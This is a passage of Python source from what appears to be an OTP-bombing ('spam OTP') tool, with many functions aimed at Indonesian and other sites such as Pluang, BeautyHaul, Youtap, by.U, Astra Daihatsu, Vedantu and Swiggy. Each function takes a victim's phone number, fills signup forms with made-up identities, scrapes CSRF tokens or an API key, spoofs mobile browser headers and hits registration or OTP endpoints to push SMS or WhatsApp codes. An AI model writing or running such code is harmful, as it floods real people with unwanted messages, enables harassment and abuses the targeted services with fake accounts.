        nama = f"{random.choice(first)} {random.choice(last)}"
        email = f"{nama.lower().replace(' ', '')}{random.randint(10,99)}@gmail.com"
        device_id = f"web-{str(__import__('uuid').uuid4())}"
        request_id = str(__import__('uuid').uuid4())

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://trade.pluang.com",
            "referer": "https://trade.pluang.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-device-id": device_id,
            "x-language-code": "id",
            "x-platform": "desktop-web",
            "x-request-id": request_id
        }

        payload = {
            "name": nama,
            "email": email,
            "phone": nomor,
            "messageMedium": "WHATSAPP_MESSAGE",
            "referral": "",
            "signature": "107216cfe6d1023ceeb94a5c63f498f6a126160345d4ad9b375daef34371ebfe"
        }

        resp = session.post(
            "https://api-pluang.pluang.com/api/v3/user/signup/phone",
            json=payload,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_beautyhaul(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        session = requests.Session()

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama_depan = random.choice(first)
        nama_belakang = random.choice(last)
        email = f"{nama_depan.lower()}{nama_belakang.lower()}{random.randint(10,99)}@gmail.com"
        password = spam_otp_codex(10) + str(random.randint(10,99))
        tgl = f"{random.randint(1,28)} {random.choice(['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'])} {random.randint(1985,2000)}"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.beautyhaul.com",
            "referer": "https://www.beautyhaul.com/account/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        session.get(
            "https://www.beautyhaul.com/account/register",
            headers={"user-agent": headers["user-agent"]},
            timeout=10
        )

        resp_reg = session.post(
            "https://www.beautyhaul.com/ajax/account/save_register",
            json={
                "nama_depan": nama_depan,
                "nama_belakang": nama_belakang,
                "email": email,
                "g-recaptcha-response": "",
                "jenis_kelamin": random.choice(["Male", "Female"]),
                "konfirmasi_password": password,
                "nomor_kode_id": "100",
                "nomor_kode_value": "62",
                "nomor_ponsel": nomor,
                "password": password,
                "subscribe": "true",
                "tanggal_lahir": tgl,
                "terms": "true"
            },
            headers=headers,
            timeout=10
        )

        if resp_reg.status_code != 200:
            return False

        # Step 3 - Send OTP
        resp = session.post(
            "https://www.beautyhaul.com/ajax/account/send_otp",
            json={"method": "WhatsApp"},
            headers=headers,
            timeout=10
        )

        return resp.status_code == 200
    except:
        return False
        
def spam_otp_qurbanplus(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        first = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra', 'Wati', 'Hidayat']
        nama = f"{random.choice(first)} {random.choice(last)}"
        email = f"{nama.lower().replace(' ', '')}{random.randint(10,99)}@gmail.com"
        password = spam_otp_codex(10) + str(random.randint(10, 99))

        session = requests.Session()

        headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://qurbanplus.com",
            "referer": "https://qurbanplus.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        resp = session.post(
            "https://api.qurbanplus.com/api/main/register",
            json={
                "area_code": "+62",
                "email": email,
                "name": nama,
                "password": password,
                "password_confirmation": password,
                "phone_no": nomor
            },
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_youtap(nomor):
    try:
        if nomor.startswith("62"):
            nomor_format = nomor
        elif nomor.startswith("0"):
            nomor_format = "62" + nomor[1:]
        else:
            nomor_format = "62" + nomor

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://bos.youtap.id",
            "referer": "https://bos.youtap.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-content-type-options": "nosniff",
            "x-platform-id": "WEB",
            "x-timezone": "Asia/Jakarta",
            "x-village-id": "7ceec169-6e16-11ec-a41a-9383440169c7"
        }

        resp1 = session.post(
            "https://bos-api.youtap.id/v1/graphql",
            json={
                "variables": {"checkPhoneInput": {"phone": nomor_format, "platformType": "BOS_REGISTRATION"}},
                "query": "mutation ($checkPhoneInput: CheckPhoneInput!) {\n checkPhone(checkPhoneInput: $checkPhoneInput) {\n merchantRegistration {\n id\n phone\n platformType\n otpExpiredAt\n }\n token\n }\n}"
            },
            headers=headers,
            timeout=10
        )

        token = resp1.json().get("data", {}).get("checkPhone", {}).get("token")
        if not token:
            return False

        headers["authorization"] = f"Bearer {token}"

        resp2 = session.post(
            "https://bos-api.youtap.id/v1/graphql",
            json={
                "variables": {},
                "query": "mutation {\n regenerateOTP {\n otpExpiredAt\n }\n}"
            },
            headers=headers,
            timeout=10
        )

        return "otpExpiredAt" in resp2.text

    except:
        return False
        
def spam_otp_byu(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp"

        headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ3NDk2NzQiLCJhcCI6IjExMjA0MzgyNjEiLCJpZCI6IjBhZmM0ODY2ZDY3MWU5MzM3OTk3YWUxY2M5ZDEwMzI1NTQ1ZWM1YmVhMzkzMzVjIiwidHIiOiIwYWZjNDg2NmQ2NzFlOTMzNzk5N2FlMWNjOWQxMDMyNTU0NWVjNWJlYTM5MzM1YyIsImZlIjoiMTc3NzYwNzYzODUyOCIsInByIjoiMS40NzQ5MTc0LTExMjA0MzgyNjEtNTU0NWVjNWJlYTM5MzM1Yy0tMTc3NzYwNzYzODUyOCIsInR0IjoxLCJ0ayI6IjE4NjM1MTkiLCJzIjoiMDEifX0=",
            "origin": "https://pidaw-webfront.cx.byu.id",
            "referer": "https://pidaw-webfront.cx.byu.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "slocation": "CL",
            "traceparent": "00-0afcc4866d671e9337997ae1cc9d1032-5545ec5bea39335c-01",
            "tracestate": "1863519@nr=0-1-4749174-1120438261-5545ec5bea39335c----1777607638528",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-deviceid": "17776076111271930882471",
            "x-request-id": "a33150a0-87cd-48ea-89ad-7314024949aa"
        }

        payload = {
            "identifier": nomor_lokal,
            "channel": "web"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False

def spam_otp_astradaihatsu2(nomor):
    try:
        if nomor.startswith("0"):
            nomor_intl = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor_intl = nomor[1:]
        else:
            nomor_intl = nomor

        session = requests.Session()

        r1 = session.get(
            "https://www.astra-daihatsu.id/register",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            },
            timeout=10
        )

        csrf = re.search(r'name="CSRFToken" value="([^"]+)"', r1.text)
        if not csrf:
            return False
        csrf_token = csrf.group(1)

        r2 = session.post(
            "https://www.astra-daihatsu.id/otp/whatsapp/generate",
            headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json; charset=UTF-8",
                "csrftoken": csrf_token,
                "origin": "https://www.astra-daihatsu.id",
                "referer": "https://www.astra-daihatsu.id/register",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            },
            json={"phoneNo": nomor_intl},
            timeout=10
        )

        return r2.status_code == 200

    except:
        return False
        
def spam_otp_astradaihatsu_sms(nomor):
    try:
        if nomor.startswith("0"):
            nomor_intl = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor_intl = nomor[1:]
        else:
            nomor_intl = nomor

        session = requests.Session()

        r1 = session.get(
            "https://www.astra-daihatsu.id/register",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            },
            timeout=10
        )

        csrf = re.search(r'name="CSRFToken" value="([^"]+)"', r1.text)
        if not csrf:
            return False
        csrf_token = csrf.group(1)

        r2 = session.post(
            "https://www.astra-daihatsu.id/otp/sms/generate",
            headers={
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json; charset=UTF-8",
                "csrftoken": csrf_token,
                "origin": "https://www.astra-daihatsu.id",
                "referer": "https://www.astra-daihatsu.id/register",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "x-requested-with": "XMLHttpRequest"
            },
            json={"phoneNo": nomor_intl},
            timeout=10
        )

        return r2.status_code == 200

    except:
        return False
        
def spam_otp_vedantu(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        session = requests.Session()
        url = "https://user.vedantu.com/user/preLoginVerification"

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "v-auth-token=8HQ63zA7QqVd8mMu; auth-token=8Hq63zA7QqVd8mMU",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        payload = {
            "email": None,
            "event": "NEW_FLOW",
            "phoneCode": "+62",
            "phoneNumber": nomor,
            "sType": "VEDANTU_F_7_N",
            "sValue": "FC34EE3ED29933CD6722BA8151D3E",
            "token": "5nXaR2BzqApBb3Wf",
            "ver": 1.033,
            "version": 2
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_viuum(nomor):
    try:
        import random

        if not nomor.startswith("62"):
            if nomor.startswith("0"):
                nomor = "62" + nomor[1:]
            else:
                nomor = "62" + nomor

        first_names = ["Ahmad", "Budi", "Citra", "Dewi", "Eko", "Fajar", "Gilang", "Hana", "Indra", "Joko"]
        last_names = ["Santoso", "Wijaya", "Kusuma", "Pratama", "Sanjaya", "Hidayat", "Nugroho", "Saputra", "Rahayu", "Utama"]
        nama_random = f"{random.choice(first_names)} {random.choice(last_names)}"

        session = requests.Session()
        url = "https://api.viuum.co.id/api_viuum/v1/pos/reservasi"

        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "api.viuum.co.id",
            "Origin": "https://wearviuum.com",
            "Referer": "https://wearviuum.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        payload = {
            "name": nama_random,
            "number": nomor,
            "store": "SMS"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_onebunda(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        session = requests.Session()

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        # Step 1 - Ambil cookie & CSRF token
        resp_page = session.get(
            "https://onebunda.com/accounts/login/",
            headers=headers,
            timeout=10
        )

        csrf = ""
        for line in resp_page.text.splitlines():
            if "csrfmiddlewaretoken" in line and 'value="' in line:
                csrf = line.split('value="')[1].split('"')[0]
                break

        if not csrf:
            return False

        # Step 2 - Kirim OTP
        resp = session.post(
            "https://onebunda.com/accounts/login/",
            data={
                "mobile_number": nomor,
                "csrfmiddlewaretoken": csrf
            },
            headers={
                **headers,
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://onebunda.com",
                "referer": "https://onebunda.com/accounts/login/",
            },
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_bonusbelanja(nomor):
    try:
        if nomor.startswith("0"):
            nomor = "62" + nomor[1:]
        elif not nomor.startswith("62"):
            nomor = "62" + nomor

        session = requests.Session()

        session.get(
            "https://www.bonusbelanja.com/register/",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            },
            timeout=10
        )

        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.bonusbelanja.com",
            "referer": "https://www.bonusbelanja.com/register/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        payload = {
            "phone": nomor,
            "name": "Amirudin Husaeni",
            "agreeContact": True,
            "agreeTnc": True
        }

        resp = session.post(
            "https://www.bonusbelanja.com/api/auth/registration/app",
            json=payload,
            headers=headers,
            timeout=10
        )
        return resp.status_code < 400
    except:
        return False
        
def spam_otp_ibudanbalita(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()

        first = ['Siti', 'Dewi', 'Rina', 'Maya', 'Fitri', 'Ani', 'Yuni', 'Rini', 'Lina', 'Nita']
        last = ['Rahayu', 'Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Wati', 'Hidayat', 'Lestari']
        nama = f"{random.choice(first)} {random.choice(last)}"

        chars_upper = string.ascii_uppercase
        chars_lower = string.ascii_lowercase
        chars_digit = string.digits
        chars_symbol = "!@#$%^&*"
        password = (
            random.choice(chars_upper) +
            random.choice(chars_lower) +
            random.choice(chars_digit) +
            random.choice(chars_symbol) +
            ''.join(random.choices(chars_upper + chars_lower + chars_digit + chars_symbol, k=8))
        )
        password = ''.join(random.sample(password, len(password)))

        ua = "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"

        resp_page = session.get(
            "https://www.ibudanbalita.com/poinprimagro/tabung-poin",
            headers={"user-agent": ua},
            timeout=10
        )

        token = None
        for line in resp_page.text.splitlines():
            if '_token" content="' in line:
                try:
                    token = line.split('_token" content="')[1].split('"')[0]
                    break
                except:
                    pass

        if not token:
            import re
            match = re.search(r'_token["\s]+content=["\s]*([^">\s]+)', resp_page.text)
            if match:
                token = match.group(1)

        if not token:
            return False

        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.ibudanbalita.com",
            "sec-fetch-site": "same-origin",
            "user-agent": ua,
            "x-csrf-token": token,
            "x-requested-with": "XMLHttpRequest"
        }

        data = {
            "full_name": nama,
            "maternal_status": "mother",
            "due_date": "",
            "dob": "",
            "mobile": nomor_lokal,
            "email": "",
            "password": password,
            "scregakp": "",
            "children[full_name]": f"Anak {random.choice(first)}",
            "children[dob]": f"202{random.randint(2,4)}-{str(random.randint(1,12)).zfill(2)}-{str(random.randint(1,28)).zfill(2)}",
            "redirect": "https://www.ibudanbalita.com/ebook",
            "local_storage": "none"
        }

        resp = session.post(
            "https://www.ibudanbalita.com/aitindo/registration/register",
            data=data,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

    except:
        return False
        
def spam_otp_swiggy(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()

        session = requests.Session()

        # Step 1 - Ambil cookie
        session.get(
            "https://www.swiggy.com/auth",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br"
            },
            timeout=10
        )

        # Step 2 - Signup / Kirim OTP
        resp = session.post(
            "https://www.swiggy.com/mapi/auth/signup",
            json={
                "name": nama,
                "email": "",
                "mobile": nomor,
                "password": "",
                "referral_code": "",
                "countryCode": "62",
                "countryKey": "IN"
            },
            headers={
                "accept": "*/*",
                "__fetch_req__": "true",
                "content-type": "application/json",
                "origin": "https://www.swiggy.com",
                "platform": "mweb",
                "referer": "https://www.swiggy.com/auth/register",
                "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "user-id": "0",
                "Accept-Encoding": "gzip, deflate, br"
            },
            timeout=10
        )

        data = resp.json()
        return data.get("statusCode") == 0
    except:
        return False
        
def spam_otp_cilory(nomor):
    try:
        if nomor.startswith("62"):
            nomor = nomor[2:]
        elif nomor.startswith("0"):
            nomor = nomor[1:]

        session = requests.Session()

        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.cilory.com",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        resp = session.post(
            "https://www.cilory.com/app/w/auth/soft",
            json={"mobile": nomor, "country_code": "+62"},
            headers=headers,
            timeout=10
        )

        result = resp.json()
        return result.get("errors") == []
    except:
        return False
        
def spam_otp_naturalfarm(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        # Step 1 - Ambil API key dari JS
        js_resp = session.get(
            "https://www.naturalfarm.id/_nuxt/401b963.js",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"},
            timeout=10
        )
        import re
        key_match = re.search(r'dZp91nhRNg6u[^"]*', js_resp.text)
        if not key_match:
            return False
        api_key = key_match.group(0)

        # Data wilayah valid
        wilayah = [
            {"province": 1,  "city": 161, "subdistrict": 2236, "label": "Bali, Jembrana, Pekutatan"},
            {"province": 32, "city": 322, "subdistrict": 4569, "label": "Sumatera Barat, Padang Pariaman, 2 X 11 Kayu Tanam"},
        ]
        w = random.choice(wilayah)
        address_id = f"{w['province']}_{w['city']}_{w['subdistrict']}"

        # Random data
        first_names = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
        last_names  = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
        first_name  = random.choice(first_names)
        last_name   = random.choice(last_names)
        email       = f"{first_name.lower()}{last_name.lower()}{random.randint(10,99)}@gmail.com"
        password    = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + str(random.randint(100,999))

        year      = random.randint(1985, 2000)
        month     = random.randint(1, 12)
        day       = random.randint(1, 28)
        birthdate = f"{year}-{month:02d}-{day:02d}"
        gender    = random.choice([1, 2])

        streets = ['JL.Merdeka', 'JL.Sudirman', 'JL.Gatot Subroto', 'JL.Ahmad Yani', 'JL.Diponegoro']
        street  = f"{random.choice(streets)} No. {random.randint(1, 100)}"

        headers = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "max-age=86400",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "api.naturalfarm.id",
            "key": api_key,
            "Origin": "https://www.naturalfarm.id",
            "Referer": "https://www.naturalfarm.id/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
        }

        payload = {
            "first_name": first_name,
            "last_name":  last_name,
            "email":      email,
            "phone":      nomor,
            "password":   password,
            "birthdate":  birthdate,
            "gender":     gender,
            "platform":   1,
            "province":   w["province"],
            "city":       w["city"],
            "subdistrict": w["subdistrict"],
            "address_id": address_id,
            "label":      w["label"],
            "street":     street,
            "referral_code": "",
            "card_code":  None
        }

        resp = session.post(
            "https://api.naturalfarm.id/api/appv1-1/register/phone",
            json=payload,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

    except:
        return False
        
def spam_otp_frradius(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()

        first = ['Amir', 'Budi', 'Deni', 'Eko', 'Fajar', 'Hadi', 'Irwan', 'Joko', 'Kevin', 'Lutfi',
                 'Siti', 'Dewi', 'Rina', 'Maya', 'Fitri', 'Ani', 'Yuni', 'Rini', 'Lina', 'Nita']
        last = ['Rahayu', 'Santoso', 'Wijaya', 'Kusuma', 'Pratama', 'Sari', 'Putri', 'Wati', 'Hidayat', 'Lestari']
        nama = f"{random.choice(first)} {random.choice(last)}"
        username = f"{''.join(random.choices(string.ascii_lowercase, k=6))}{random.randint(10,99)}"
        email = f"{username}@gmail.com"

        chars_upper = string.ascii_uppercase
        chars_lower = string.ascii_lowercase
        chars_digit = string.digits
        chars_symbol = "!@#$%^&*"
        password = (
            random.choice(chars_upper) +
            random.choice(chars_lower) +
            random.choice(chars_digit) +
            random.choice(chars_symbol) +
            ''.join(random.choices(chars_upper + chars_lower + chars_digit + chars_symbol, k=8))
        )
        password = ''.join(random.sample(password, len(password)))

        ua = "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"

        # Step 1: Ambil halaman register + cookie + token
        resp_page = session.get(
            "https://my.frradius.com/register",
            headers={"user-agent": ua},
            timeout=10
        )

        token = None
        for line in resp_page.text.splitlines():
            if 'name="_token" value="' in line:
                try:
                    token = line.split('name="_token" value="')[1].split('"')[0]
                    break
                except:
                    pass

        if not token:
            import re
            match = re.search(r'name="_token"\s+value="([^"]+)"', resp_page.text)
            if match:
                token = match.group(1)

        if not token:
            return False

        # Step 2: Kirim OTP
        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate",
            "origin": "https://my.frradius.com",
            "referer": "https://my.frradius.com/register",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": ua,
            "x-csrf-token": token,
        }

        data = {
            "_token": token,
            "name": nama,
            "username": username,
            "email": email,
            "whatsapp": nomor_lokal,
            "password": password,
            "password_confirmation": password,
            "terms": "1",
        }

        resp = session.post(
            "https://my.frradius.com/register/send-otp",
            data=data,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

    except:
        return False
        
def spam_otp_internetrakyat(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://internetrakyat.id",
            "Referer": "https://internetrakyat.id/auth/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-api-key": "280999!FTTH"
        }

        resp = session.post(
            "https://internetrakyat.id/api/app/auth/send-otp-register",
            json={"phone_number": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_gritero(nomor):
    try:
        import random, string
        if not nomor.startswith("62"):
            nomor = "62" + nomor.lstrip("0")
        first = ["Andi","Budi","Citra","Dewi","Eko","Fitri","Gita","Hadi","Indah","Joko"]
        last = ["Santoso","Wijaya","Kusuma","Pratama","Sari","Putri","Rahayu","Wibowo"]
        nama = f"{random.choice(first)} {random.choice(last)}"
        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        email = f"{user}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
        url = "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id"
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "langcode": "id",
            "origin": "https://gritero.com",
            "referer": "https://gritero.com/",
            "source": "ocistok",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "xid": "2995761938"
        }
